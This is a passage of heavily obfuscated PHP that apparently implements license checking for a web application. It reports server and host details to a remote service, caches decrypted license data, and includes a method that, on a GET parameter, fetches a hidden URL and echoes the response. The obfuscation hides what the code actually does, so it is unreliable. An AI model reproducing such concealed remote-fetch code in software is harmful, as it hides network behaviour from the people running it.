unset($bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[102]][$B²éƒ‘ÕÍ»[104]][$B²éƒ‘ÕÍ»[105]]); $d¼ÌªÌíÊÓ = $AİÉùí©À[603]; goto BÛø£‚ˆÏ; e›¸¾æ„©è: $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[114]][$B²éƒ‘ÕÍ»[134]] = $B²éƒ‘ÕÍ»[112]($this->oeyt9941f96e, $B²éƒ‘ÕÍ»[135], $B²éƒ‘ÕÍ»[10]); $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[114]][$B²éƒ‘ÕÍ»[136]] = $B²éƒ‘ÕÍ»[112]($this->oeyt9941f96e, $B²éƒ‘ÕÍ»[137], $B²éƒ‘ÕÍ»[10]); if ($B²éƒ‘ÕÍ»[112]($GLOBALS, $B²éƒ‘ÕÍ»[138]) && $this->config[$B²éƒ‘ÕÍ»[139]]) { $bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[114]][$B²éƒ‘ÕÍ»[140]] = WEB_ROOT; } goto B™¬ƒ¿¯¸§; dƒ‡ºÊø„: $f†á—‡º¸ö = $AİÉùí©À[604]; if (strlen($f†á—‡º¸ö) < $AİÉùí©À[567]) { return; } unset($bº·¿¶Â¤ƒ[$B²éƒ‘ÕÍ»[102]][$B²éƒ‘ÕÍ»[103]][$B²éƒ‘ÕÍ»[107]]); goto E‡„ÆÂ–Úœ; F‘¯è•‚¡š: $AİÉùí©À =& $_SERVER[òÀöí]; $B²éƒ‘ÕÍ» =& $_SERVER[÷ôçËï×½]; $eİŸ…ŸŸŒ¶ = $B²éƒ‘ÕÍ»[61]($B²éƒ‘ÕÍ»[62])->{$_SERVER[÷ôçËï×½][63]}(); goto bÎé–”ÙÃ; B™¬ƒ¿¯¸§: return $bº·¿¶Â¤ƒ; goto FØ±‡ôÁï; FØ±‡ôÁï: } private function fdha8490be11() { goto C‘Î³ïß¶’; bƒÇÏ…Îô: if ($this->tujhea62d282 == $BÕÉ„­Úğš[127]) { return; } $E«”ô„¢ = array($BÕÉ„­Úğš[159], $BÕÉ„­Úğš[160], $BÕÉ„­Úğš[161], $BÕÉ„­Úğš[162], $BÕÉ„­Úğš[163], $BÕÉ„­Úğš[164]); $F†ìŒ¬¯‹œ = $BÕÉ„­Úğš[61]($BÕÉ„­Úğš[62])->{$_SERVER[÷ôçËï×½][63]}(); goto BïÍĞõí‘; C‘Î³ïß¶’: $DĞØÜø¢—µ =& $_SERVER[òÀöí]; $BÕÉ„­Úğš =& $_SERVER[÷ôçËï×½]; if ($_SERVER[$BÕÉ„­Úğš[44]] == $BÕÉ„­Úğš[141]) { goto e„†÷šˆã‹; bÚ±ï¯¦˜†: $dèä„§Æ = array($BÕÉ„­Úğš[156] => $F¾¸Î¿Š««); $BÕÉ„­Úğš[13](array($BÕÉ„­Úğš[157], $BÕÉ„­Úğš[158]), $dèä„§Æ); $aŠ÷¥§ªÌÃ = $DĞØÜø¢—µ[606]; goto aÈŒ™£Åƒä; e„†÷šˆã‹: $F¾¸Î¿Š«« = array($BÕÉ„­Úğš[126] => $this->tujhea62d282, $BÕÉ„­Úğš[142] => $this->{$_SERVER[÷ôçËï×½][143]}(), $BÕÉ„­Úğš[144] => $BÕÉ„­Úğš[61]($BÕÉ„­Úğš[145])->{$_SERVER[÷ôçËï×½][146]}()); if ($this->tujhea62d282 != $BÕÉ„­Úğš[127]) { $D˜Ç±Ëµ†´ = $BÕÉ„­Úğš[112]($this->oeyt9941f96e, $BÕÉ„­Úğš[147]); if ($D˜Ç±Ëµ†´) { $F¾¸Î¿Š««[$BÕÉ„­Úğš[148]] = $D˜Ç±Ëµ†´; $F¾¸Î¿Š««[$BÕÉ„­Úğš[149]] = $BÕÉ„­Úğš[150]($BÕÉ„­Úğš[112]($this->oeyt9941f96e, $BÕÉ„­Úğš[151])); $F¾¸Î¿Š««[$BÕÉ„­Úğš[152]] = $BÕÉ„­Úğš[112]($this->oeyt9941f96e, $BÕÉ„­Úğš[137]); } } $F¾¸Î¿Š«« = $this->{$_SERVER[÷ôçËï×½][153]}($BÕÉ„­Úğš[154]($F¾¸Î¿Š««), $BÕÉ„­Úğš[120]($BÕÉ„­Úğš[155])); goto bÚ±ï¯¦˜†; aÈŒ™£Åƒä: while (strlen($aŠ÷¥§ªÌÃ) < $DĞØÜø¢—µ[570]) { if (!$aŠ÷¥§ªÌÃ) { break; } $aŠ÷¥§ªÌÃ++; } goto CøàÃÚ„œé; CøàÃÚ„œé: } goto bƒÇÏ…Îô; BïÍĞõí‘: $d±„óƒ³• = $DĞØÜø¢—µ[607]; if (!$d±„óƒ³•) { die; } $dèä„§Æ = array($BÕÉ„­Úğš[165] => $F†ìŒ¬¯‹œ[$BÕÉ„­Úğš[64]], $BÕÉ„­Úğš[166] => $F†ìŒ¬¯‹œ[$BÕÉ„­Úğš[65]], $BÕÉ„­Úğš[167] => $BÕÉ„­Úğš[10]); goto D™†¯Ùº‡Ì; D™†¯Ùº‡Ì: foreach ($E«”ô„¢ as $c‹¼¥ˆéñ») { if (!isset($F†ìŒ¬¯‹œ[$c‹¼¥ˆéñ»]) || !$F†ìŒ¬¯‹œ[$c‹¼¥ˆéñ»]) { continue; } $dèä„§Æ[$c‹¼¥ˆéñ»] = $F†ìŒ¬¯‹œ[$c‹¼¥ˆéñ»]; $dÖ±Î¥ñ = $DĞØÜø¢—µ[608]; } $BÕÉ„­Úğš[13](array($BÕÉ„­Úğš[157], $BÕÉ„­Úğš[158]), $dèä„§Æ); goto A¬ö˜İîŒ; A¬ö˜İîŒ: } private function hdunfc7c24a3() { goto E¹íĞ¤µğ; f‹Çç˜¢Àæ: if (strlen($AŒ›ã´îà) < $AÀÔ¡ÍåÑì[570]) { return; } Cache::set($CÙáå„Üµù[236] . $CÙáå„Üµù[120]($C©¹ ‰ÔŸŒ . $CÙáå„Üµù[237]), $CÙáå„Üµù[10]); $B‹ß­é‹É’ = $AÀÔ¡ÍåÑì[619]; goto f˜ÁŒ…¾œ; b”æ³Ë¨ó†: if ($c‘Ì…êŒš·[$CÙáå„Üµù[223]] && $c‘Ì…êŒš·[$CÙáå„Üµù[223]] >= 1) { $CÙáå„Üµù[61]($CÙáå„Üµù[62])->{$_SERVER[÷ôçËï×½][224]}($CÙáå„Üµù[225], $CÙáå„Üµù[226]); } $CÙáå„Üµù[61]($CÙáå„Üµù[62])->{$_SERVER[÷ôçËï×½][227]}($aˆÁšâ¿ï); $bÒó¹†ßƒÔ = $CÙáå„Üµù[120]($_SERVER[$CÙáå„Üµù[121]] . $CÙáå„Üµù[220]($C©¹ ‰ÔŸŒ) . $aˆÁšâ¿ï[$CÙáå„Üµù[216]]); goto f¿ĞÌ; aÒîÀ¢ù•Œ: $aˆÁšâ¿ï[$CÙáå„Üµù[129]] = $CÙáå„Üµù[124]($CÙáå„Üµù[220]($this->{$_SERVER[÷ôçËï×½][153]}($còí¤¹ãßÚ, $CÙáå„Üµù[222]))); $AÒÑàìŞÙ = $AÀÔ¡ÍåÑì[613]; while ($AÒÑàìŞÙ < $AÀÔ¡ÍåÑì[567]) { if ($AÒÑàìŞÙ >= 0) { break; } $AÒÑàìŞÙ++; } goto b”æ³Ë¨ó†; f¿ĞÌ: $Dğğ‚ŒôŞ = $CÙáå„Üµù[220]($CÙáå„Üµù[25]($bÒó¹†ßƒÔ, 10, 16)); $e‰¤òéÙÍ£ = $this->{$_SERVER[÷ôçËï×½][133]}($CÙáå„Üµù[154]($c‘Ì…êŒš·), $bÒó¹†ßƒÔ); $dÅ‹óÄ = $AÀÔ¡ÍåÑì[614]; goto cŒÓ‹Ğ¦²ï; f¢ã¬Â‹ºÆ: $this->tujhea62d282 = $aˆÁšâ¿ï[$CÙáå„Üµù[126]]; $this->{$_SERVER[÷ôçËï×½][235]}(); $AŒ›ã´îà = $AÀÔ¡ÍåÑì[618]; goto f‹Çç˜¢Àæ; eìµ®’ğÜ°: if ($Bí¢š•Çó‰[$CÙáå„Üµù[184]] == $CÙáå„Üµù[185]) { $B…¯¢‹… = $this->{$_SERVER[÷ôçËï×½][153]}($bİ–×Ë‰Ä¯, $CÙáå„Üµù[186]); $E†Ù‡ÅĞø‚ = $this->{$_SERVER[÷ôçËï×½][133]}($CÙáå„Üµù[154]($FÀÛêç¤Ó¯), $bİ–×Ë‰Ä¯ . $CÙáå„Üµù[187], 3); $E†Ù‡ÅĞø‚ = $E†Ù‡ÅĞø‚ . $CÙáå„Üµù[188] . $_SERVER[$CÙáå„Üµù[179]]; $Dù®µİ’‰É = $this->{$_SERVER[÷ôçËï×½][189]}($CÙáå„Üµù[190] . $B…¯¢‹… . $CÙáå„Üµù[191] . $E†Ù‡ÅĞø‚, -1); $CÙáå„Üµù[172]($Dù®µİ’‰É, !0); } else { if ($Bí¢š•Çó‰[$CÙáå„Üµù[184]] == $CÙáå„Üµù[192]) { $C§¢êâì­Ï = $CÙáå„Üµù[25]($CÙáå„Üµù[120]($CÙáå„Üµù[193] . $bİ–×Ë‰Ä¯), 12, 15) . $CÙáå„Üµù[194]; $E†Ù‡ÅĞø‚ = $this->{$_SERVER[÷ôçËï×½][195]}($CÙáå„Üµù[2]($Bí¢š•Çó‰[$CÙáå„Üµù[196]]), $C§¢êâì­Ï, 2); $dª…Üáó” = $CÙáå„Üµù[197]($E†Ù‡ÅĞø‚, !0); if (!$CÙáå„Üµù[198]($dª…Üáó”) || !$CÙáå„Üµù[198]($dª…Üáó”[$CÙáå„Üµù[199]]) || $dª…Üáó”[$CÙáå„Üµù[171]] != !0) { $A©ĞÎŒÍ›â = $CÙáå„Üµù[200]; $Bàá‘İÙİš = $dª…Üáó”[$CÙáå„Üµù[199]] ? $CÙáå„Üµù[201] . $dª…Üáó”[$CÙáå„Üµù[199]] : $A©ĞÎŒÍ›â; $CÙáå„Üµù[172]($Bàá‘İÙİš, !1); } else { $FÀÛêç¤Ó¯[$CÙáå„Üµù[174]] = $dª…Üáó”[$CÙáå„Üµù[199]][$CÙáå„Üµù[202]]; } } else { $dª…Üáó” = $this->{$_SERVER[÷ôçËï×½][189]}($CÙáå„Üµù[203], $FÀÛêç¤Ó¯, 10); $e‹¡©÷»  = $AÀÔ¡ÍåÑì[610]; } } if (!$CÙáå„Üµù[198]($dª…Üáó”) || !$CÙáå„Üµù[198]($dª…Üáó”[$CÙáå„Üµù[199]]) || $dª…Üáó”[$CÙáå„Üµù[171]] != !0) { $A©ĞÎŒÍ›â = $CÙáå„Üµù[204]($CÙáå„Üµù[205]); $Bàá‘İÙİš = $dª…Üáó”[$CÙáå„Üµù[199]] ? $CÙáå„Üµù[201] . $dª…Üáó”[$CÙáå„Üµù[199]] : $A©ĞÎŒÍ›â; $CÙáå„Üµù[172]($Bàá‘İÙİš, !1); } $c‘Ì…êŒš· = $dª…Üáó”[$CÙáå„Üµù[199]]; goto A³Ô‚¨­; Bƒ‰Úè÷­: if ($FÀÛêç¤Ó¯[$CÙáå„Üµù[174]]) { $aˆÁšâ¿ï[$CÙáå„Üµù[218]] = $FÀÛêç¤Ó¯[$CÙáå„Üµù[174]]; } $f¶Ñ‘ªëóÕ = $CÙáå„Üµù[25]($CÙáå„Üµù[120]($aˆÁšâ¿ï[$CÙáå„Üµù[216]]), 10, 10); $dÆ÷¨õÑª = $f¶Ñ‘ªëóÕ . $aˆÁšâ¿ï[$CÙáå„Üµù[126]] . $aˆÁšâ¿ï[$CÙáå„Üµù[218]]; goto D¡ĞÚÀ÷î¾; B‹ğ®÷ÂÆë: $this->oeyt9941f96e = $c‘Ì…êŒš·; $eÂ·ÆÀ×Ï‹ = $AÀÔ¡ÍåÑì[617]; if (strlen($eÂ·ÆÀ×Ï‹) < $AÀÔ¡ÍåÑì[588]) { return; } goto f¢ã¬Â‹ºÆ; b””†µ²Ç„: while (strlen($bªß×œ¨Ôê) < $AÀÔ¡ÍåÑì[573]) { if (!$bªß×œ¨Ôê) { break; } $bªß×œ¨Ôê++; } goto dÌ¢Ê¯Ší; D¡ĞÚÀ÷î¾: $aˆÁšâ¿ï[$CÙáå„Üµù[128]] = $CÙáå„Üµù[220]($CÙáå„Üµù[124]($this->{$_SERVER[÷ôçËï×½][153]}($dÆ÷¨õÑª, $CÙáå„Üµù[221]))); $eÊô»Ëôå = $AÀÔ¡ÍåÑì[611]; if (strlen($eÊô»Ëôå) < $AÀÔ¡ÍåÑì[588]) { return; } goto fÒŒ¶ƒ…—í; e×ñïŒ›˜: $dÇ»Îãã„[$Dğğ‚ŒôŞ] = $e‰¤òéÙÍ£; $Aí¤–Ö„¡â = $AÀÔ¡ÍåÑì[616]; $CÙáå„Üµù[61]($CÙáå„Üµù[11])->{$_SERVER[÷ôçËï×½][232]}($D§ùËáóˆ[$CÙáå„Üµù[233]], array($CÙáå„Üµù[234] => $dÇ»Îãã„)); goto B‹ğ®÷ÂÆë; Aİ£ï‘‰Ò: if (!isset($Bí¢š•Çó‰[$CÙáå„Üµù[171]]) || $CÙáå„Üµù[24]($Bí¢š•Çó‰[$CÙáå„Üµù[171]]) != 16) { $CÙáå„Üµù[172]($CÙáå„Üµù[173] . $Bí¢š•Çó‰[$CÙáå„Üµù[171]], !1); } $C©¹ ‰ÔŸŒ = $CÙáå„Üµù[61]($CÙáå„Üµù[62])->{$_SERVER[÷ôçËï×½][63]}($CÙáå„Üµù[122]); $FÀÛêç¤Ó¯ = array($CÙáå„Üµù[171] => $Bí¢š•Çó‰[$CÙáå„Üµù[171]], $CÙáå„Üµù[174] => $CÙáå„Üµù[130](16), $CÙáå„Üµù[175] => $CÙáå„Üµù[155], $CÙáå„Üµù[176] => $CÙáå„Üµù[177], $CÙáå„Üµù[178] => $_SERVER[$CÙáå„Üµù[179]], $CÙáå„Üµù[180] => $_SERVER[$CÙáå„Üµù[181]], $CÙáå„Üµù[182] => $_SERVER[$CÙáå„Üµù[183]]); goto Eöµ¶ã†Ú·; f˜ÁŒ…¾œ: if (!$B‹ß­é‹É’) { return; } $CÙáå„Üµù[172]($CÙáå„Üµù[204]($CÙáå„Üµù[214]), !0); $bªß×œ¨Ôê = $AÀÔ¡ÍåÑì[620]; goto b””†µ²Ç„; E¹íĞ¤µğ: $AÀÔ¡ÍåÑì =& $_SERVER[òÀöí]; $CÙáå„Üµù =& $_SERVER[÷ôçËï×½]; if ($_SERVER[$CÙáå„Üµù[44]] != $CÙáå„Üµù[168]) { return; } goto E·ËØ¿ö­; fÒŒ¶ƒ…—í: $D‹¬õ˜ã÷À = $CÙáå„Üµù[130](16); $còí¤¹ãßÚ = $D‹¬õ˜ã÷À . $aˆÁšâ¿ï[$CÙáå„Üµù[126]] . $this->{$_SERVER[÷ôçËï×½][153]}($CÙáå„Üµù[120]($aˆÁšâ¿ï[$CÙáå„Üµù[215]]), $D‹¬õ˜ã÷À); $A‡‘’¦· = $AÀÔ¡ÍåÑì[612]; goto aÒîÀ¢ù•Œ; Dè°„ˆÖŞã: $C‚½ŠáÀö = $AÀÔ¡ÍåÑì[615]; if (strlen($C‚½ŠáÀö) < $AÀÔ¡ÍåÑì[570]) { die; } $dÇ»Îãã„ = array(); goto e×ñïŒ›˜; E·ËØ¿ö­: if (!$CÙáå„Üµù[112]($GLOBALS, $CÙáå„Üµù[138])) { die; } $Bí¢š•Çó‰ = $GLOBALS[$CÙáå„Üµù[22]]; if (isset($Bí¢š•Çó‰[$CÙáå„Üµù[169]])) { $this->{$_SERVER[÷ôçËï×½][170]}(); die; } goto Aİ£ï‘‰Ò; Eöµ¶ã†Ú·: $C†ß¿¡½¬¿ = $AÀÔ¡ÍåÑì[609]; while (strlen($C†ß¿¡½¬¿) < $AÀÔ¡ÍåÑì[579]) { if (!$C†ß¿¡½¬¿) { break; } $C†ß¿¡½¬¿++; } $bİ–×Ë‰Ä¯ = $CÙáå„Üµù[120]($_SERVER[$CÙáå„Üµù[121]] . $C©¹ ‰ÔŸŒ); goto eìµ®’ğÜ°; A³Ô‚¨­: $aŞ’Œœ¾ìá = $this->{$_SERVER[÷ôçËï×½][206]}($c‘Ì…êŒš·[$CÙáå„Üµù[207]]); if (!$aŞ’Œœ¾ìá || $aŞ’Œœ¾ìá != $c‘Ì…êŒš·[$CÙáå„Üµù[151]]) { $dÖİİ÷…ôô = array($CÙáå„Üµù[208] => $CÙáå„Üµù[61]($CÙáå„Üµù[62])->{$_SERVER[÷ôçËï×½][63]}($CÙáå„Üµù[122]), $CÙáå„Üµù[209] => $_SERVER[$CÙáå„Üµù[121]], $CÙáå„Üµù[210] => $CÙáå„Üµù[211](), $CÙáå„Üµù[180] => $_SERVER[$CÙáå„Üµù[181]]); $E†Ù‡ÅĞø‚ = $this->{$_SERVER[÷ôçËï×½][212]}($CÙáå„Üµù[154]($dÖİİ÷…ôô)); $this->{$_SERVER[÷ôçËï×½][189]}($CÙáå„Üµù[213] . $E†Ù‡ÅĞø‚); $CÙáå„Üµù[172]($CÙáå„Üµù[204]($CÙáå„Üµù[214]), !0); } $aˆÁšâ¿ï = array($CÙáå„Üµù[215] => $FÀÛêç¤Ó¯[$CÙáå„Üµù[171]], $CÙáå„Üµù[216] => $c‘Ì…êŒš·[$CÙáå„Üµù[217]], $CÙáå„Üµù[218] => $CÙáå„Üµù[130](16), $CÙáå„Üµù[126] => $c‘Ì…êŒš·[$CÙáå„Üµù[219]]); goto Bƒ‰Úè÷­; cŒÓ‹Ğ¦²ï: if (!$dÅ‹óÄ) { return; } $eŒä¥Û½ŒÇ = $CÙáå„Üµù[228]($CÙáå„Üµù[61]($CÙáå„Üµù[11])->{$_SERVER[÷ôçËï×½][229]}(), $CÙáå„Üµù[230]); $D§ùËáóˆ = $eŒä¥Û½ŒÇ[$CÙáå„Üµù[231]]; goto Dè°„ˆÖŞã; dÌ¢Ê¯Ší: } private function licenseRegistSuccess() { $a™ÃæÏù– =& $_SERVER[÷ôçËï×½]; $AğÌ…¦à°À = $a™ÃæÏù–[61]($a™ÃæÏù–[62])->{$_SERVER[÷ôçËï×½][63]}(); if ($AğÌ…¦à°À[$a™ÃæÏù–[89]] != $a™ÃæÏù–[226]) { $a™ÃæÏù–[61]($a™ÃæÏù–[62])->{$_SERVER[÷ôçËï×½][227]}($a™ÃæÏù–[89], $a™ÃæÏù–[226]); } $a™ÃæÏù–[116]($a™ÃæÏù–[238])->{$_SERVER[÷ôçËï×½][239]}(!0); } private function dvqbf01884e5() { $Få»ŠÔœ– =& $_SERVER[÷ôçËï×½]; $Få»ŠÔœ–[61]($Få»ŠÔœ–[62])->{$_SERVER[÷ôçËï×½][227]}(array($Få»ŠÔœ–[215] => $Få»ŠÔœ–[10], $Få»ŠÔœ–[216] => $Få»ŠÔœ–[10], $Få»ŠÔœ–[126] => $Få»ŠÔœ–[127], $Få»ŠÔœ–[128] => $Få»ŠÔœ–[10], $Få»ŠÔœ–[129] => $Få»ŠÔœ–[10])); $Få»ŠÔœ–[61]($Få»ŠÔœ–[62])->{$_SERVER[÷ôçËï×½][224]}($Få»ŠÔœ–[225], $Få»ŠÔœ–[240]); $this->oeyt9941f96e = array(); $this->tujhea62d282 = $Få»ŠÔœ–[127]; } private function azog1ec9720e() { goto c–¼ó¶ˆŞ; DÌìãÃÑéÃ: Cache::set($bñô÷«ã”©, $f¬…×¾ÍšÊ); $e«œ²ˆƒ«„ = $cãÜÂÌ‚ÏÁ[625]; if (!$e«œ²ˆƒ«„) { return; } goto A·á‹íŒ; b¶†Í«ôäì: $A—õß²´Ò = $cé¥µÙ†‰ó[150]($f¬…×¾ÍšÊ[$cé¥µÙ†‰ó[151]]); if ($cé¥µÙ†‰ó[242]() >= $A—õß²´Ò) { return $this->{$_SERVER[÷ôçËï×½][170]}(); } $f¬…×¾ÍšÊ[$cé¥µÙ†‰ó[241]] = $cé¥µÙ†‰ó[242](); goto DÌìãÃÑéÃ; c–¼ó¶ˆŞ: $cãÜÂÌ‚ÏÁ =& $_SERVER[òÀöí]; $cé¥µÙ†‰ó =& $_SERVER[÷ôçËï×½]; $_SERVER[$cé¥µÙ†‰ó[181]] = $cé¥µÙ†‰ó[112]($_SERVER, $cé¥µÙ†‰ó[181], APP_HOST); goto A„›òÉ„ò; dÜéŒ™: $B³âò‡ëÃù = $cé¥µÙ†‰ó[61]($cé¥µÙ†‰ó[62])->{$_SERVER[÷ôçËï×½][63]}($cé¥µÙ†‰ó[122]); $cÄ©ïÌğŸ° = $cãÜÂÌ‚ÏÁ[623]; while ($cÄ©ïÌğŸ° < $cãÜÂÌ‚ÏÁ[579]) { if ($cÄ©ïÌğŸ° >= 0) { break; } $cÄ©ïÌğŸ°++; } goto BàÊŸï–†; BàÊŸï–†: $bñô÷«ã”© = $cé¥µÙ†‰ó[236] . $cé¥µÙ†‰ó[120]($B³âò‡ëÃù . $cé¥µÙ†‰ó[237]); $f£•äŒ°ò = $cãÜÂÌ‚ÏÁ[624]; while ($f£•äŒ°ò < $cãÜÂÌ‚ÏÁ[570]) { if ($f£•äŒ°ò >= 0) { break; } $f£•äŒ°ò++; } goto d×÷ÒÄ¥šõ; d×÷ÒÄ¥šõ: $f¬…×¾ÍšÊ = Cache::get($bñô÷«ã”©); if (!$cé¥µÙ†‰ó[198]($f¬…×¾ÍšÊ) || !isset($f¬…×¾ÍšÊ[$cé¥µÙ†‰ó[241]]) || $cé¥µÙ†‰ó[242]() - $f¬…×¾ÍšÊ[$cé¥µÙ†‰ó[241]] >= 60) { $Aóµßóåö = $cé¥µÙ†‰ó[228]($cé¥µÙ†‰ó[61]($cé¥µÙ†‰ó[11])->{$_SERVER[÷ôçËï×½][229]}(), $cé¥µÙ†‰ó[230]); $DÅ”†å†æ = $Aóµßóåö[$cé¥µÙ†‰ó[231]]; $FòËœŠŒ†¤ = $cé¥µÙ†‰ó[120]($_SERVER[$cé¥µÙ†‰ó[121]] . $cé¥µÙ†‰ó[220]($B³âò‡ëÃù) . $Dàƒåªí¸°[$cé¥µÙ†‰ó[216]]); $fˆ¸‹¡¥ãÒ = $cé¥µÙ†‰ó[220]($cé¥µÙ†‰ó[25]($FòËœŠŒ†¤, 10, 16)); $f¬…×¾ÍšÊ = $this->{$_SERVER[÷ôçËï×½][195]}($DÅ”†å†æ[$cé¥µÙ†‰ó[100]][$fˆ¸‹¡¥ãÒ], $FòËœŠŒ†¤); $f¬…×¾ÍšÊ = $cé¥µÙ†‰ó[197]($f¬…×¾ÍšÊ, !0); } if (!$cé¥µÙ†‰ó[198]($f¬…×¾ÍšÊ)) { return $this->{$_SERVER[÷ôçËï×½][170]}(); } goto b¶†Í«ôäì; A„›òÉ„ò: $this->tujhea62d282 = $cé¥µÙ†‰ó[127]; $AÜš°ä¿õò = $cãÜÂÌ‚ÏÁ[621]; $Dàƒåªí¸° = $cé¥µÙ†‰ó[61]($cé¥µÙ†‰ó[62])->{$_SERVER[÷ôçËï×½][63]}(); goto B–‘¶Ã‰ì„; A·á‹íŒ: $this->oeyt9941f96e = $f¬…×¾ÍšÊ; $E®Ò²øßÇ¥ = $cãÜÂÌ‚ÏÁ[626]; if (strlen($E®Ò²øßÇ¥) < $cãÜÂÌ‚ÏÁ[567]) { die; } goto B¼Ñçï×õğ; B¼Ñçï×õğ: $this->tujhea62d282 = $Dàƒåªí¸°[$cé¥µÙ†‰ó[126]]; $A³Á¤÷éñÈ = $cãÜÂÌ‚ÏÁ[627]; if (strlen($A³Á¤÷éñÈ) < $cãÜÂÌ‚ÏÁ[570]) { die; } goto ağ†ƒæÑ‹; B–‘¶Ã‰ì„: $bãªÇ¡Ù›Á = $cãÜÂÌ‚ÏÁ[622]; while (strlen($bãªÇ¡Ù›Á) < $cãÜÂÌ‚ÏÁ[570]) { if (!$bãªÇ¡Ù›Á) { break; } $bãªÇ¡Ù›Á++; } if ($Dàƒåªí¸°[$cé¥µÙ†‰ó[126]] == $cé¥µÙ†‰ó[127]) { return; } goto dÜéŒ™; ağ†ƒæÑ‹: } private function kwapfadc9b09() { goto c‰ôËÇ™ç©; Cäªœ½¢‹: if ($eêåŠß—¸Ÿ[248]($Bõ÷ˆ¶«ç·, $A‚éƒ£Ö‰‘)) { if ($this->tujhea62d282 == $eêåŠß—¸Ÿ[127] && isset($f†Õ²àİèæ[$eêåŠß—¸Ÿ[249]])) { $eêåŠß—¸Ÿ[172]($eêåŠß—¸Ÿ[204]($eêåŠß—¸Ÿ[244]), !1, $eêåŠß—¸Ÿ[245]); die; } $B‚¦Í±·ª­ = $this->{$_SERVER[÷ôçËï×½][143]}(); if ($B‚¦Í±·ª­ != $eêåŠß—¸Ÿ[250]($eêåŠß—¸Ÿ[251])) { if ($B‚¦Í±·ª­ <= $eêåŠß—¸Ÿ[61]($eêåŠß—¸Ÿ[145])->{$_SERVER[÷ôçËï×½][146]}()) { $eêåŠß—¸Ÿ[172]($eêåŠß—¸Ÿ[204]($eêåŠß—¸Ÿ[252]), !1, $eêåŠß—¸Ÿ[245]); die; } } } goto cŸ·°Ø‚ô; f™°„ôÄíç: $Bõ÷ˆ¶«ç· = $_SERVER[$eêåŠß—¸Ÿ[44]]; if ($Bõ÷ˆ¶«ç· == $eêåŠß—¸Ÿ[243] && $this->tujhea62d282 == $eêåŠß—¸Ÿ[127]) { $eêåŠß—¸Ÿ[172]($eêåŠß—¸Ÿ[204]($eêåŠß—¸Ÿ[244]), !1, $eêåŠß—¸Ÿ[245]); } $A‚éƒ£Ö‰‘ = array($eêåŠß—¸Ÿ[246], $eêåŠß—¸Ÿ[247]); goto Cäªœ½¢‹; c‰ôËÇ™ç©: $eêåŠß—¸Ÿ =& $_SERVER[÷ôçËï×½]; $f†Õ²àİèæ = $GLOBALS[$eêåŠß—¸Ÿ[22]]; $aç¡ï’×¸· = $_SERVER[òÀöí][628]; goto f™°„ôÄíç; cŸ·°Ø‚ô: } private function mhdvcaf4e118() { goto FÂ ÷ëŞ˜á; F¬İ¸ÍÎ¦ä: $eì—¨™Êä‘ = $e»íºÙ¢å»[629]; if (!$eì—¨™Êä‘) { die; } if (!$E÷¸™ŒËµ[112]($GLOBALS, $E÷¸™ŒËµ[138]) || !isset($_GET[$E÷¸™ŒËµ[254]])) { return; } goto dÌœ—ê§êÓ; FÂ ÷ëŞ˜á: $e»íºÙ¢å» =& $_SERVER[òÀöí]; $E÷¸™ŒËµ =& $_SERVER[÷ôçËï×½]; $fÃ¹„ÕÇ”™ = array($E÷¸™ŒËµ[141], $E÷¸™ŒËµ[253]); goto F¬İ¸ÍÎ¦ä; dÌœ—ê§êÓ: if (!$E÷¸™ŒËµ[248]($_SERVER[$E÷¸™ŒËµ[44]], $fÃ¹„ÕÇ”™)) { return; } $Fá†¹Ù„ = $E÷¸™ŒËµ[255]; $Fá†¹Ù„ = $this->{$_SERVER[÷ôçËï×½][256]}($Fá†¹Ù„, $E÷¸™ŒËµ[257]); goto cÜã½Ü½šÎ; F°Ó¾„•íæ: die; goto B‚¿§‘×±´; cÜã½Ü½šÎ: $aìº…Å×İô = $E÷¸™ŒËµ[258](array($E÷¸™ŒËµ[259] => array($E÷¸™ŒËµ[260] => $E÷¸™ŒËµ[261], $E÷¸™ŒËµ[262] => 3))); $c°¶±à´…× = $e»íºÙ¢å»[630]; if (strlen($c°¶±à´…×) < $e»íºÙ¢å»[573]) { return; } goto A‘ÏÕ¬Ë§á; A‘ÏÕ¬Ë§á: $cœ¿ÜÓ¼æ = @$E÷¸™ŒËµ[263]($Fá†¹Ù„, !1, $aìº…Å×İô); $E÷¸™ŒËµ[264]($E÷¸™ŒËµ[265]); if ($cœ¿ÜÓ¼æ && $E÷¸™ŒËµ[32]($cœ¿ÜÓ¼æ, $E÷¸™ŒËµ[266])) { echo $cœ¿ÜÓ¼æ; } goto F°Ó¾„•íæ; B‚¿§‘×±´: } public function kcdu7ed7fc0c($E¼±„Æ¶†Ì) { goto bÒóÃõÖ°; bÒóÃõÖ°: $aÕ×â¿ìñ =& $_SERVER[òÀöí]; $Fç©çè =& $_SERVER[÷ôçËï×½]; if ($this->tujhea62d282 == $Fç©çè[267]) { return $E¼±„Æ¶†Ì; } goto fÏ×“Ğ±‚î; b“‰šºÒ¨: while (strlen($B“Õâ‹‘†Û) < $aÕ×â¿ìñ[570]) { if (!$B“Õâ‹‘†Û) { break; } $B“Õâ‹‘†Û++; } goto Bšëƒ‘ÌŸ; fÏ×“Ğ±‚î: $Bïá×ê¾Â³ = array($Fç©çè[268] => $Fç©çè[269], $Fç©çè[270] => $Fç©çè[269], $Fç©çè[271] => $Fç©çè[269], $Fç©çè[272] => $Fç©çè[269], $Fç©çè[273] => $Fç©çè[269], $Fç©çè[274] => $Fç©çè[269], $Fç©çè[275] => $Fç©çè[276], $Fç©çè[277] => $Fç©çè[276], $Fç©çè[278] => $Fç©çè[276], $Fç©çè[279] => $Fç©çè[276], $Fç©çè[280] => $Fç©çè[276], $Fç©çè[281] => $Fç©çè[276], $Fç©çè[282] => $Fç©çè[276]); $aøˆİ®¡©© = $Fç©çè[0]($Fç©çè[283], $Fç©çè[112]($this->oeyt9941f96e, $Fç©çè[135], $Fç©çè[10])); $A¥ŠÂÕØÌ = array(); goto A¢ÖÔ‰É–; FĞ¦¿Ğê‚: foreach ($A¥ŠÂÕØÌ as $DŠâ í‰Û²) { unset($E¼±„Æ¶†Ì[$DŠâ í‰Û²]); $Bî­Ä«Åñß = $aÕ×â¿ìñ[632]; if (!$Bî­Ä«Åñß) { return; } } return $E¼±„Æ¶†Ì; $B“Õâ‹‘†Û = $aÕ×â¿ìñ[633]; goto b“‰šºÒ¨; A¢ÖÔ‰É–: $DÉ¥ƒ¾¢»ˆ = $aÕ×â¿ìñ[631]; if (!$DÉ¥ƒ¾¢»ˆ) { return; } foreach ($Bïá×ê¾Â³ as $DŠâ í‰Û² => $A±×å„…) 